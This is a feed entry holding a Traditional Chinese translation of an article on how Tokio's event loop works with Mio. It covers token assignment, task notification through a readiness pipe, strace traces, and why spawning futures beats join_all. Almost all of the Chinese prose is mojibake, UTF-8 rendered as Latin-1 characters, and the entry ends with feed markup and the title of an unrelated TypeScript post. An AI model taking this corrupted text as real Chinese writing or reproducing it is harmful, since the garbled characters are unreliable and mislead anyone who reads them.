è™•ç† future æ™‚ï¼ŒTask æ˜¯æœ€åŸºç¤çš„åŸ·è¡Œå–®å…ƒï¼Œä¸”åŸºæœ¬ä¸Šå°±æ˜¯ç¶ è‰²ç·šç¨‹ï¼Œæä¾›å”èª¿å¼å¤šå·¥ï¼Œå…è¨±åœ¨åŒä¸€å€‹ç³»çµ±ç·šç¨‹æœ‰å¤šå€‹åŸ·è¡Œèªå½™ç’°å¢ƒã€‚ç•¶ä¸€å€‹ task ç„¡æ³•æœ‰æ‰€é€²å±•ï¼Œæœƒè®“è™•ç†å™¨å…ˆè™•ç†å…¶ä»–å¯åŸ·è¡Œçš„ taskã€‚æˆ‘å€‘å¿…é ˆç†è§£çš„æ˜¯ï¼Œã€Œé€šçŸ¥ã€æœƒç™¼ç”Ÿåœ¨ task å±¤ç´šè€Œé future å±¤ç´šã€‚ç•¶ä¸€å€‹ task è¢«é€šçŸ¥æ™‚ï¼Œå®ƒæœƒè¼ªè©¢å®ƒé€£çµçš„æœ€é«˜å±¤ç´šçš„ futureï¼Œé€™æœƒå°è‡´ä»»ä½•æˆ–æ˜¯å…¨éƒ¨çš„ child future åŒæ¨£è¢«è¼ªè©¢ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€å€‹ task æœ€é«˜å±¤ç´šçš„ future æ˜¯ä¸€å€‹ä»¥ join_all çµ„åˆçš„åå€‹ futureï¼Œè€Œå…¶ä¸­ä¸€å€‹ future å®‰æ’è¦é€šçŸ¥æ­¤ä¸€ taskï¼Œå‰‡ç„¡è«–éœ€ä¸éœ€è¦ï¼Œå…¨éƒ¨åå€‹ future çš†é ˆæ¥å—è¼ªè©¢ã€‚
Tokioâ€™s interface with MioTokio åˆ©ç”¨ä¸Šè¿°çš„ Mio ã€Œéç³»çµ±äº‹ä»¶ã€ï¼Œå°‡ task é€šçŸ¥è½‰æ›ç‚º Mio çš„äº‹ä»¶ã€‚åœ¨å–å¾—ä¸€å€‹ Mio çš„ (Registrationã€SetReadinessï¼‰å…ƒçµ„å¾Œï¼ŒTokio æœƒå°‡ Registrationï¼ˆä¸€å€‹ Eventedï¼‰è¨»å†Šè‡³ Mio çš„ poll ï¼ˆevent loopï¼‰ä¸­ï¼Œå†å°‡ SetReadiness å°è£åœ¨å¯¦ä½œäº† Notify trait çš„ MySetReadiness ä¸­ã€‚åŸå§‹ç¢¼å¦‚ä¸‹ï¼š
struct MySetReadiness(mio::SetReadiness);impl Notify for MySetReadiness &#123;    fn notify(&amp;self, _id: usize) &#123;        self.0.set_readiness(mio::Ready::readable())              .expect(&quot;failed to set readiness&quot;);    &#125;&#125;

åœ¨é€™å€‹ä½œæ³•ä¸­ï¼Œtask çš„é€šçŸ¥å°‡è½‰æ›ç‚º Mio äº‹ä»¶ï¼Œä¸”å¯ä»¥é€é Tokio çš„äº‹ä»¶è™•ç†èˆ‡åˆ†æ´¾æ©Ÿåˆ¶èˆ‡å…¶ä»– Mio äº‹ä»¶ä½œä¼™è™•ç†ã€‚
å¦‚åŒ Mio å°è£ std::net å…§çš„ UdpSocketã€TcpListenerï¼Œä»¥åŠ TcpStream ä¾†å®¢è£½åŒ–éœ€æ±‚ï¼ŒTokio ä¹Ÿåˆ©ç”¨äº†çµ„åˆï¼ˆcompositionï¼‰èˆ‡è£é£¾ï¼ˆdecorationï¼‰å»ºç«‹é€™äº›å‹åˆ¥çš„ Tokio ç‰ˆã€‚èˆ‰ä¾‹ä¾†èªªï¼ŒTokio çš„ UdpSocket æ¶æ§‹å¤§è‡´å¦‚ä¸‹ï¼š

Tokio ç‰ˆæœ¬çš„ I&#x2F;O ä¾†æºå‹åˆ¥çš„å»ºæ§‹å­éƒ½éœ€è¦å‚³å…¥ event loop çš„ handleï¼ˆtokio_core::reactor::Handleï¼‰ã€‚ç•¶å¯¦ä¾‹åŒ–æ™‚ï¼Œé€™äº›å‹åˆ¥æœƒå°‡å®ƒå€‘çš„ socket è¨»å†Šè‡³ Mio poll çš„ event loop ä¸Šï¼Œä»¥åˆ©æ¥æ”¶ edge-triggredï¼ˆè­¯æ³¨ï¼šä¸€ç¨® epoll event çš„è§¸ç™¼æ¨¡å¼ï¼‰çš„äº‹ä»¶åŠå…¶æ–°è³¦äºˆçš„å¶æ•¸æ•¸å­— tokenï¼ˆä»¥ä¸‹æœƒè§£é‡‹ï¼‰ã€‚ç•¶åº•å±¤çš„ I&#x2F;O æ“ä½œå›å‚³ WouldBlock æ™‚ï¼Œé€™äº›å‹åˆ¥å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å®‰æ’ç•¶å‰çš„ task ä¾†æ¥æ”¶è®€å¯«çš„ readinessã€‚
Tokio åœ¨ Mio ä¸Šè¨»å†Šäº†è¨±å¤š Evented å‹åˆ¥ï¼Œå„²å­˜åœ¨ç‰¹å®šçš„ token ä¸Šï¼š

Token 0ï¼ˆTOKEN_MESSAGESï¼‰ï¼šç”¨æ–¼ Tokio å…§éƒ¨çš„æ¶ˆæ¯ä½‡åˆ—ï¼ˆmessage queueï¼‰ï¼Œé€™å€‹ä½‡åˆ—æä¾›ç§»é™¤ I&#x2F;O ä¾†æºã€æ¥æ”¶è®€å¯« readiness é€šçŸ¥çš„ task æ’ç¨‹ï¼Œè¨­å®š timeoutï¼Œä»¥åŠåŸ·è¡Œåœ¨ event loop èªå½™ç’°å¢ƒä¸­çš„ä»»æ„é–‰åŒ…ã€‚é€™å€‹ token å¯ä»¥å®‰å…¨åœ°å¾å…¶ä»–ç·šç¨‹èˆ‡ event loop æºé€šã€‚ä¾‹å¦‚ï¼ŒRemote::spawn() é€éè¨Šæ¯ç³»çµ±ï¼Œå°‡ future é€é” event loopã€‚
  å¯¦ä½œä¸Šï¼Œæ¶ˆæ¯ä½‡åˆ—æ˜¯ä¸€å€‹ futures::sync::mpsc streamã€‚èº«ç‚ºä¸€å€‹ futures::stream::Streamï¼ˆèˆ‡ future é¡ä¼¼ï¼Œä½†æ˜¯ç”¢ç”Ÿä¸€åºåˆ—çš„å€¼è€Œéå–®ä¸€å€¼ï¼‰ï¼Œæ¶ˆæ¯ä½‡åˆ—ä½¿ç”¨ä¸Šè¿° MySetReadiness æ–¹æ¡ˆä¾†è™•ç†ï¼Œè€Œ Registration å‰‡æ˜¯ä»¥ TOKEN_MESSAGES é€™å€‹ token è¨»å†Šã€‚ç•¶æ¥æ”¶åˆ° TOKEN_MESSAGES äº‹ä»¶æ™‚ï¼Œè©²äº‹ä»¶æœƒåˆ†æ´¾åˆ° consume_queue() æ–¹æ³•é€²ä¸€æ­¥è™•ç†ã€‚ï¼ˆåŸå§‹ç¢¼ï¼šenum Messageã€consume_queue()ï¼‰

Token 1ï¼ˆTOKEN_FUTUREï¼‰ï¼šç”¨æ–¼é€šçŸ¥ Tokio éœ€è¦è¼ªè©¢ main taskã€‚é€™å€‹ token æœƒåœ¨èˆ‡ main task ç›¸é—œè¯çš„é€šçŸ¥ä¸Šï¼ˆä¹Ÿå°±æ˜¯å‚³å…¥ Core::run() çš„ future æˆ–å®ƒçš„å­ futureï¼Œè€Œéé€é spawn() åœ¨ä¸åŒ task ä¸­åŸ·è¡Œçš„ futureï¼‰ã€‚é€™å€‹äº‹ä»¶åŒæ¨£ç”¨äº† MySetReadiness æ–¹æ¡ˆå°‡ future è½‰è­¯æˆ Mio çš„äº‹ä»¶ã€‚åœ¨ä¸€å€‹ future è¢« main task åŸ·è¡Œå‰ï¼Œæœƒå…ˆå›å‚³ Async::NotReadyï¼Œä¸¦ä»¥å…¶æ‰€é¸çš„æ–¹å¼åœ¨ç¨å¾Œç™¼å¸ƒé€šçŸ¥ã€‚ç•¶æ¥æ”¶äº† TOKEN_FUTURE äº‹ä»¶ï¼ŒTokio event loop å°±æœƒå†æ¬¡è¼ªè©¢ main taskã€‚

å¤§æ–¼ 1 çš„å¶æ•¸ tokenï¼ˆTOKEN_START + key * 2ï¼‰ï¼šç”¨ä¾†æŒ‡ç¤º I&#x2F;O ä¾†æºçš„ readiness æ”¹è®Šã€‚Token ä¸­çš„ key æ˜¯ Slab keyï¼Œé—œè¯å€¼æ˜¯ Core::inner::io_dispatch Slab&lt;ScheduledIo&gt;ã€‚ç•¶ Mio çš„ I&#x2F;O ä¾†æºå‹åˆ¥ï¼ˆUdpSocketã€TcpListenerã€TcpStreamï¼‰å¯¦ä¾‹åŒ–ä¹‹åˆï¼Œæœƒè‡ªå‹•ä»¥æ­¤ token è¨»å†Šã€‚

å¤§æ–¼ 1 çš„å¥‡æ•¸ tokenï¼ˆTOKEN_START + key * 2 + 1ï¼‰ï¼šç”¨ä¾†æŒ‡ç¤ºä¸€å€‹ spawned taskï¼ˆåŠå…¶é—œè¯çš„ futureï¼‰éœ€è¦è¢«è¼ªè©¢ã€‚Token ä¸­çš„ key æ˜¯ Slab keyï¼Œé—œè¯å€¼æ˜¯ Core::inner::task_dispatch Slab&lt;ScheduledTask&gt;ã€‚å’Œ TOKEN_MESSAGES èˆ‡ TOKEN_FUTURE äº‹ä»¶ç›¸åŒï¼Œé€™å€‹äº‹ä»¶ä¹Ÿç”¨äº† MySetReadiness æºé€šã€‚


Tokio event loopTokioï¼Œæ›´ç²¾ç¢ºä¾†èªªæ˜¯ tokio_core::reactor::Core æä¾›äº† event loop ä¾†ç®¡ç† futures å’Œ tasksï¼Œé©…å‹• future å®Œæˆï¼Œä»¥åŠèˆ‡ Mio ä»‹æ¥çš„ä»‹é¢ï¼Œè®“ I&#x2F;O äº‹ä»¶å¯æ­£ç¢ºé€šçŸ¥å°æ‡‰çš„ taskã€‚ä½¿ç”¨ event loop éœ€é€é Core::new() å¯¦ä¾‹åŒ–ä¸€å€‹ Coreï¼Œä¸¦èª¿ç”¨ Core::run() å‚³å…¥ä¸€å€‹ futureã€‚é€™å€‹ event loop åœ¨è¿”å›ä¹‹å‰ï¼Œå°‡æœƒé©…å‹•å‚³å…¥çš„ future è‡³å®Œæˆã€‚ä»¥ä¼ºæœå™¨ç¨‹å¼ä¾†èªªï¼ˆserve applicationï¼‰ï¼Œé€™å€‹ future å¾ˆå¯èƒ½ç”Ÿå‘½é€±æœŸè¼ƒé•·ï¼Œä¾‹å¦‚ä½¿ç”¨ TcpListener æŒçºŒæ¥æ”¶æ–°å‚³å…¥çš„é€£çµï¼Œæ¯å€‹é€£çµé€é Handle.spawn() åˆ†åˆ¥å»ºç«‹ taskï¼Œç”±è‡ªèº«çš„ future ç¨ç«‹è™•ç†ã€‚
ä»¥ä¸‹çš„æµç¨‹åœ–å¤§ç•¥é»å‡º Tokio event loop çš„åŸºæœ¬è¼ªå»“ï¼š

What happens when data arrives on a socket?æƒ³äº†è§£ Tokioï¼Œå¯ä»¥è§€å¯Ÿç•¶è³‡æ–™æŠµé” socket æ™‚ï¼Œevent loop ç™¼ç”Ÿçš„æ¯å€‹æ­¥é©Ÿã€‚æˆ‘å¾ˆè¨ç•°åœ°ç™¼ç¾ï¼Œé€™å€‹éç¨‹æœ€çµ‚åˆ†ç‚ºå…©éƒ¨åˆ†ï¼Œåˆ†åˆ¥åœ¨ event loop å…§å„è‡ªçš„è¿­ä»£ä¸­ï¼Œé€²è¡Œå„è‡ªçš„ epoll äº¤æ˜“è™•ç†ã€‚ç¬¬ä¸€éƒ¨åˆ†è² è²¬ç•¶ socket è®€å–å°±ç·’æ™‚ï¼ˆä¾‹å¦‚ï¼ŒMio äº‹ä»¶å¸¶è‘—æ¯” 1 å¤§çš„å¶æ•¸ tokenï¼Œæˆ– main task çš„ TOKEN_FUTUREï¼‰ï¼Œå‚³é€é€šçŸ¥åˆ°å°è©² socket æœ‰èˆˆè¶£çš„ taskï¼›ç¬¬äºŒéƒ¨åˆ†å‰‡æ˜¯é€éè¼ªè©¢ task èˆ‡å®ƒçš„ future ä¾†è™•ç†é€šçŸ¥ï¼ˆä¾‹å¦‚ï¼ŒMio äº‹ä»¶å¸¶è‘—æ¯” 1 å¤§çš„å¥‡æ•¸ tokenï¼‰ã€‚æˆ‘å€‘ä¾†äº†è§£ä»¥ä¸‹æƒ…å¢ƒï¼šä¸€å€‹ spawned task å¾ Linux ä¸Šçš„ UdpSocketï¼Œé€é Tokio event loop è®€å–è³‡æ–™ï¼Œä¸¦å‡è¨­å‰ä¸€æ¬¡è¼ªè©¢çµæœå°è‡´ recv_from() å›å‚³ä¸€å€‹ WouldBlock éŒ¯èª¤ã€‚

Tokio event loop èª¿ç”¨ mio::Poll:poll()ï¼Œè©²æ–¹æ³•è½‰è€Œèª¿ç”¨ epoll_wait()ï¼ˆåœ¨ Linux ä¸Šï¼‰é€²è€Œé˜»å¡åˆ°æŸå€‹ç›£æ¸¬ä¸­çš„ file descriptor ç™¼ç”Ÿäº† readiness æ”¹è®Šçš„äº‹ä»¶ã€‚ç•¶ä¸Šè¿°æƒ…å½¢ç™¼ç”Ÿå¾Œï¼Œepoll_wait() å›å‚³ä¸€å€‹ epoll_event structs çš„é™£åˆ—ï¼Œç”¨ä»¥æè¿°ç™¼ç”Ÿä»€éº¼äº‹ï¼Œé€™äº› structs ä¹Ÿå°‡é€é Mio è½‰è­¯ç‚º mio::Eventsï¼Œä¸¦è¿”å› Tokioã€‚ï¼ˆåœ¨ Linux ä¸Šï¼Œé€™äº›è½‰è­¯æ‡‰è©²æ˜¯é›¶æˆæœ¬ï¼ˆzero-costï¼‰ï¼Œå› ç‚º mio::Events å°±åªæ˜¯ç°¡å–®ï¼Œä»¥ä¸€å€‹ epoll_event é™£åˆ—çµ„æˆçš„å…ƒçµ„çµæ§‹ï¼ˆtuple structï¼‰ã€‚ï¼‰åœ¨æˆ‘å€‘çš„ä¾‹å­ï¼Œå‡è¨­åœ¨é™£åˆ—ä¸­åªæœ‰ä¸€å€‹äº‹ä»¶æŒ‡å‡º socket å·²è®€å–å°±ç·’ã€‚ç”±æ–¼è©²äº‹ä»¶çš„ token æ˜¯å¤§æ–¼ 1 çš„å¶æ•¸ï¼ŒTokio è¾¨è­˜å…¶ç‚º I&#x2F;O äº‹ä»¶ï¼Œä¸¦å¾ Slab&lt;ScheduledIo&gt; ä¸­å°‹æ‰¾å°æ‡‰çš„å…ƒç´ ï¼Œä»¥å–å¾—æœ‰å“ªäº› task å°é€™å€‹ socket çš„è®€å¯« readiness ç‹€æ…‹æœ‰èˆˆè¶£ã€‚æ¥ä¸‹ä¾†ï¼ŒTokio æœƒé€šçŸ¥å°è®€å–æœ‰èˆˆè¶£çš„ taskï¼Œé€™äº› task é€éå‰è¿°çš„ MySetReadinessï¼Œèª¿ç”¨ Mio çš„ set_readiness()ã€‚Mio æœƒå°‡é€™å€‹éç³»çµ±çš„äº‹ä»¶è©³ç´°è³‡è¨ŠåŠ åˆ° readiness ä½‡åˆ—ä¸­ï¼Œä¸¦å¯«å…¥ 0x01 åˆ° readiness pipe ä¸­ã€‚

åœ¨ Tokio event loop å¾€ä¸‹ä¸€å€‹è¿­ä»£å‰é€²ä¹‹å‰ï¼Œå®ƒæœƒå†æ¬¡è¼ªè©¢ Mioï¼ŒMio å‰‡èª¿ç”¨ epoll_wait()ï¼Œè€Œ epoll_wait() é€™æ¬¡è¿”å›ä¸€å€‹åœ¨ Mio çš„ readiness pipe ä¸Šç™¼ç”Ÿçš„è®€å– readiness äº‹ä»¶ã€‚Mio è®€å–ä¹‹å‰å¯«å…¥çš„ 0x01ï¼Œä¸¦å¾ readiness ä½‡åˆ—å–å‡ºæœ€å‰ç«¯ï¼ˆdequeueï¼‰çš„éç³»çµ±äº‹ä»¶è³‡æ–™ï¼Œä¸¦å°‡é€™å€‹äº‹ä»¶å›å‚³åˆ° Tokioã€‚ç”±æ–¼è©²äº‹ä»¶çš„ token æ˜¯å¤§æ–¼ 1 çš„å¥‡æ•¸ tokenï¼ŒTokio è¾¨è­˜å…¶ç‚º task é€šçŸ¥äº‹ä»¶ï¼Œä¸¦å¾ Slab&lt;ScheduledTask&gt; ä¸­å°‹æ‰¾å°æ‡‰çš„å…ƒç´ ï¼Œä»¥å–å¾— task å¾ spawn() å›å‚³çš„æœ€åŸå§‹çš„ Spawn ç‰©ä»¶ã€‚æ¥ä¸‹ä¾†ï¼ŒTokio é€é poll_future_notify() è¼ªè©¢é€™å€‹ task èˆ‡å®ƒçš„ futureï¼Œé€™å€‹ future å¯èƒ½æœƒå¾ socket è®€å–è³‡æ–™ï¼Œç›´è‡³å¾—åˆ° WouldBlock éŒ¯èª¤ã€‚
é€™å€‹äºŒè¿­ä»£çš„æ–¹æ³•æ¶‰åŠäº† pipe è®€å¯«ï¼Œå°æ¯”å…¶ä»–éåŒæ­¥ I&#x2F;O event loopï¼Œå¯èƒ½æœƒæœ‰ä¸€é»é¡å¤–é–‹éŠ·ã€‚å¦‚æœåœ¨ä¸€å€‹å–®ç·šç¨‹çš„ç¨‹å¼ä¸­ï¼Œä½¿ç”¨ strace æœƒçœ‹åˆ°ä¸€å€‹ç·šç¨‹ç”¨ pipe èˆ‡è‡ªå·±æºé€šï¼Œå¾ˆæ˜¯å¥‡æ€ªï¼š
pipe2([4, 5], O_NONBLOCK|O_CLOEXEC) = 0...epoll_wait(3, [&#123;EPOLLIN|EPOLLOUT, &#123;u32=14, u64=14&#125;&#125;], 1024, -1) = 1write(5, &quot;\1&quot;, 1) = 1epoll_wait(3, [&#123;EPOLLIN, &#123;u32=4294967295, u64=18446744073709551615&#125;&#125;], 1024, 0) = 1read(4, &quot;\1&quot;, 128) = 1read(4, 0x7ffce1140f58, 128) = -1 EAGAIN (Resource temporarily unavailable)recvfrom(12, &quot;hello\n&quot;, 1024, 0, &#123;sa_family=AF_INET, sin_port=htons(43106), sin_addr=inet_addr(&quot;127.0.0.1&quot;)&#125;, [16]) = 6recvfrom(12, 0x7f576621c800, 1024, 0, 0x7ffce1140070, 0x7ffce114011c) = -1 EAGAIN (Resource temporarily unavailable)epoll_wait(3, [], 1024, 0) = 0epoll_wait(3, 0x7f5765b24000, 1024, -1) = -1 EINTR (Interrupted system call)

Mio é¸ç”¨ pipe çš„æ–¹æ¡ˆä¾†æ”¯æŒé€šç”¨æ€§ï¼Œä»¥é˜² set_readiness() å¯èƒ½è¢«å…¶ä»–ç·šç¨‹èª¿ç”¨ã€‚ä¹Ÿæœ‰å¯èƒ½é€™ç¨®ä½œæ³•å°å¼·åˆ¶å¯¦æ–½å…¬å¹³çš„äº‹ä»¶èª¿ç¯€èˆ‡ç¶­æŒ futures èˆ‡ I&#x2F;O çš„é–“æ¥å±¤æœ‰æ‰€å¹«åŠ©ã€‚
Lessons learned: Combining futures vs. spawning futuresæœ€åˆæ¢ç´¢ Tokio æ™‚ï¼Œæˆ‘å¯«äº†ä¸€å€‹å°ç¨‹å¼ï¼Œè² è²¬ç›£è½ä¸åŒ UDP socket é€²ä¾†çš„è³‡æ–™ã€‚é€™å€‹ç¨‹å¼å»ºç«‹åå€‹è®€å– socket çš„ future å¯¦ä¾‹ï¼Œæ¯å€‹éƒ½ç›£è½ä¸åŒçš„åŸ å£ï¼ˆportï¼‰ã€‚æˆ‘å¤©çœŸåœ°ä½¿ç”¨ join_all() å°‡æ‰€æœ‰ future åˆæˆç‚ºå–®ä¸€ futureï¼Œä¸¦å°‡ä¹‹å‚³å…¥ Core::run()ï¼Œè¨ç•°çš„æ˜¯ï¼Œæˆ‘ç™¼ç¾æ¯ç•¶ä¸€å€‹å°åŒ…é€é”ï¼Œæ‰€æœ‰ future éƒ½æœƒè¼ªè©¢ä¸€æ¬¡ã€‚å¦ä¸€å€‹é©šè¨çš„é»æ˜¯ï¼Œtokio_core::net:UdpSocket::recv_from()ï¼ˆä»¥åŠåº•å±¤çš„ PollEventedï¼‰éå¸¸è°æ˜ï¼Œç•¶ socket åœ¨å‰ä¸€æ¬¡çš„ Mio è¼ªè©¢ä¸­å°šæœªæ¨™è¨˜ç‚ºè®€å–å°±ç·’æ™‚ï¼Œæœƒé¿å…èª¿ç”¨ä½œæ¥­ç³»çµ± rectfrom()ã€‚ä»¥ä¸‹çš„ strace åæ˜ å‡ºæˆ‘å¯«çš„ future poll() çš„é™¤éŒ¯ println!()ï¼Œå¤§è‡´å¦‚ä¸‹ï¼š
epoll_wait(3, [&#123;EPOLLIN|EPOLLOUT, &#123;u32=14, u64=14&#125;&#125;], 1024, -1) = 1write(5, &quot;\1&quot;, 1) = 1epoll_wait(3, [&#123;EPOLLIN, &#123;u32=4294967295, u64=18446744073709551615&#125;&#125;], 1024, 0) = 1read(4, &quot;\1&quot;, 128) = 1read(4, 0x7ffc183129d8, 128) = -1 EAGAIN (Resource temporarily unavailable)write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21recvfrom(12, &quot;hello\n&quot;, 1024, 0, &#123;sa_family=AF_INET, sin_port=htons(43106), sin_addr=inet_addr(&quot;127.0.0.1&quot;)&#125;, [16]) = 6getsockname(12, &#123;sa_family=AF_INET, sin_port=htons(2006), sin_addr=inet_addr(&quot;127.0.0.1&quot;)&#125;, [16]) = 0write(1, &quot;recv 6 bytes from 127.0.0.1:43106 at 127.0.0.1:2006\n&quot;, 52) = 52recvfrom(12, 0x7f2a11c1c400, 1024, 0, 0x7ffc18312ba0, 0x7ffc18312c4c) = -1 EAGAIN (Resource temporarily unavailable)write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21write(1, &quot;UdpServer::poll()...\n&quot;, 21) = 21epoll_wait(3, [], 1024, 0) = 0epoll_wait(3, 0x7f2a11c36000, 1024, -1) = ...

æœ‰é‘‘æ–¼ Tokio èˆ‡ futures çš„å…·é«”å…§éƒ¨é‹ä½œæŸå€‹ç¨‹åº¦ä¸Šå°æˆ‘ä¾†èªªæœ‰é»éš±æ™¦ï¼Œæˆ‘æƒ³æˆ‘å¸Œæœ›èƒŒå¾Œæœ‰äº›é­”æ³•è·¯ç”±ï¼Œå¯ä»¥åªè¼ªè©¢å¿…è¦çš„ futuresã€‚ç•¶ç„¶ï¼Œå° Tokio æœ‰æ›´æ·±å…¥çš„ç†è§£å¾Œï¼Œæˆ‘çš„ç¨‹å¼å¾ˆæ˜é¡¯é€™æ¨£åˆ©ç”¨ futuresï¼š

é€™çš„ç¢ºå¯ä»¥åŸ·è¡Œï¼Œä½†ä¸å¤ å¥½ï¼Œå°¤å…¶æ˜¯ç•¶ä½ æœ‰ä¸€æ‹–æ‹‰åº« socket æ™‚ã€‚ç”±æ–¼é€šçŸ¥åœ¨ task å±¤ç´šç™¼ç”Ÿï¼Œä¸Šåœ–ä¸­ä»»æ„ä¸€å€‹ç¶ è‰²æ–¹æ ¼ä¸­é€šçŸ¥éƒ½æœƒå°è‡´ main task è¢«é€šçŸ¥ã€‚å®ƒå°‡æœƒè¼ªè©¢ FromAll future ä½¿å¾—æ‰€æœ‰ FromAll çš„ child future éƒ½é ˆæ¥å—è¼ªè©¢ã€‚æˆ‘çœŸæ­£éœ€è¦çš„æ˜¯ä¸€å€‹ç°¡å–®çš„ main futureï¼Œä½¿ç”¨ Handle::spawn() ä¾†å•Ÿå‹•æ¯å€‹å°è£åœ¨å„è‡ªçš„ task ä¸­çš„ futureã€‚é€™ç¨®å®‰æ’å¤§è‡´å¦‚ä¸‹åœ–ï¼š

ç•¶ä»»ä½• future å®‰æ’ä¸€å€‹é€šçŸ¥ï¼Œåªæœ‰è©² future çš„ task æœƒæ”¶åˆ°é€šçŸ¥ï¼Œä¹Ÿåªæœ‰è©² future æœƒè¢«è¼ªè©¢ï¼ˆå›æƒ³ä¸€ä¸‹ï¼Œã€Œå®‰æ’ä¸€å€‹é€šçŸ¥ã€æœƒè‡ªå‹•ç™¼ç”Ÿåœ¨ tokio_core::net:UdpSocket::rect_from() å¾ mio::net::UdpSocket::rect_from() å›å‚³å€¼ä¸­æ¥æ”¶åˆ° WouldBlock ï¼‰ã€‚future çµ„åˆæ“ä½œå­æ•˜è¿°è¡¨é”èƒ½åŠ›å¼·å‹ï¼Œå¯å¥½æ•´ä»¥æš‡åœ°æè¿°å”è­°ï¼ˆprotocolï¼‰çš„æµç¨‹è€Œä¸é ˆå¼„é«’æ‰‹å¯«æ‰‹å‹•è¼ªè©¢çš„ç‹€æ…‹æ©Ÿã€‚ç„¶è€Œé‡è¦çš„æ˜¯ï¼Œä½ å¿…é ˆç†è§£ä½ çš„è¨­è¨ˆä¹Ÿè¨±éœ€è¦æ”¯æ´å„è‡ªç¨ç«‹ï¼Œç¨è‡ªä¸”ä¸¦è¡Œé‹ä½œçš„ tasksã€‚ï¼ˆè­¯æ³¨ï¼šè€Œééƒ½åœ¨ main task ä¸Šä½¿ç”¨ join_all()ï¼‰
Final thoughtsé–±è®€ Tokioã€Mio ä»¥åŠ futures åŸå§‹ç¢¼å¾Œï¼Œå¤§å¤§å¹«åŠ©æˆ‘éå›ºå° Tokio çš„ç†è§£ï¼Œä¹Ÿé©—è­‰äº†é€éç†è§£å…·é«”å¯¦ä½œä¾†é‡æ¸…æŠ½è±¡å±¤çš„å­¸ç¿’ç­–ç•¥ã€‚é€™å€‹æ–¹æ³•åœ¨åƒ…åƒ…å­¸ç¿’æŠ½è±¡å±¤çš„ç‹¹éš˜ä½¿ç”¨æ¡ˆä¾‹æ™‚éå¸¸å±éšªï¼Œæˆ‘å€‘å¿…é ˆæ„è­˜åˆ°å…·é«”çš„ç¤ºä¾‹åƒ…æ˜¯åŠ©æ–¼ç†è§£ä¸€èˆ¬é€šä¾‹ã€‚åœ¨é–±è®€å®ŒåŸå§‹ç¢¼ä¹‹å¾Œï¼Œå†æ¬¡é–±è®€ Tokio çš„æ•™å­¸æ–‡ä»¶ï¼Œæˆ‘æœ‰äº›é¦¬å¾Œç‚®çš„æ„è¦‹ï¼šTokio éå¸¸åˆç†ï¼Œæ‡‰è©²è¦å¾ˆå®¹æ˜“ç†è§£èˆ‡ä¸Šæ‰‹ï¼
æˆ‘ä»æœ‰äº›å•é¡Œå¾…æ—¥å¾Œç ”ç©¶ï¼š

Tokio æœ‰è™•ç† edge triggeringï¼ˆLinux epollï¼‰çš„é£¢é¤“å•é¡Œï¼ˆstarvation problemï¼‰å—ï¼Ÿæˆ‘èªç‚ºé€™å€‹å•é¡Œå¯ä»¥åœ¨ future ä¸­ï¼Œä»¥å–®ä¸€ä¸€å€‹ poll() é™åˆ¶è®€ &#x2F; å¯«çš„æ•¸é‡ã€‚ç•¶é”åˆ°é€™å€‹é™åˆ¶æ™‚ï¼Œfuture å¯ä»¥åœ¨é¡¯å¼é€šçŸ¥ç•¶å‰ task æå‰è¿”å›ï¼Œè€Œéä¾é  Tokio I&#x2F;O ä¾†æºé¡å‹çš„éš±å¼ã€ŒWouldBlock æ’ç¨‹ã€è¡Œç‚ºã€‚å› æ­¤é€™ä½¿å¾—å…¶ä»– task èˆ‡ future æœ‰æ©Ÿæœƒæœ‰æ‰€é€²å±•ã€‚
Tokio æ˜¯å¦ä¸ä¾è³´æ–¼å°‡å·¥ä½œå¸è¼‰çµ¦å·¥ä½œç·šç¨‹ï¼ˆworker threadï¼‰ä»¥æœ€å¤§åŒ–è™•ç†å™¨æ ¸å¿ƒé‹ç”¨ï¼Œè€Œæ˜¯ç›´æ¥æ”¯æ´å¤šç·šç¨‹ç’°å¢ƒä¸‹åŸ·è¡Œ event loop å—ï¼Ÿ


2017-12-19 æ›´æ–°ï¼šé€™è£¡æœ‰ Reddit å°è©±ä¸²è¨è«–æœ¬æ–‡ã€‚Mio çš„ä½œè€… Carl Lerche åœ¨é€™è£¡å’Œé€™è£¡è²¼äº†äº›è³‡è¨Šé‡å……è¶³çš„ç•™è¨€ã€‚é™¤äº†å›æ‡‰ä¸Šè¿°å•é¡Œï¼Œä»–ä¹Ÿé»å‡º FuturesUnordered æ˜¯ä¸€ç¨®åˆæˆ futures çš„æ–¹æ³•ï¼Œåªæœ‰ç›¸é—œçš„ child future æœƒè¢«è¼ªè©¢ï¼Œä»¥é¿å…æ‰€æœ‰ future åƒä½¿ç”¨ join_all() å…¨éƒ¨è¼ªè©¢ï¼Œä¸éé€™æ–¹æ³•æœ‰äº›é¡å¤–çš„è¨˜æ†¶é«”é…ç½®é–‹éŠ·è¦è¡¡é‡ã€‚å¦å¤–ï¼Œæœªä¾†çš„ Tokio å°‡è¦é·é›¢ mio::Registration çš„é€šçŸ¥æ–¹æ¡ˆï¼Œç›®çš„æ˜¯ç°¡åŒ–å‰è¿°ä¸€äº›æ­¥é©Ÿã€‚


2017-12-21 æ›´æ–°ï¼šçœ‹èµ·ä¾† Hacker News ä¹Ÿæœ‰åœ¨è¨è«–é€™ç¯‡æ–‡ç« ã€‚

é—œæ–¼è­¯è€…ï¼š@weihanglo æ›è‘— iOS å·¥ç¨‹å¸«ä¹‹åï¼Œè¡Œé–‹ç™¼ Web App ä¹‹å¯¦ã€‚
]]></content>
      <tags>
        <tag>Rust, Tokio, Asynchronous I/O, Translation</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ TypeScript è¼•é¬†å­¸ Design pattern - Command Pattern</title>
    <url>/2019/03/31/typescript-design-pattern-command/</url>
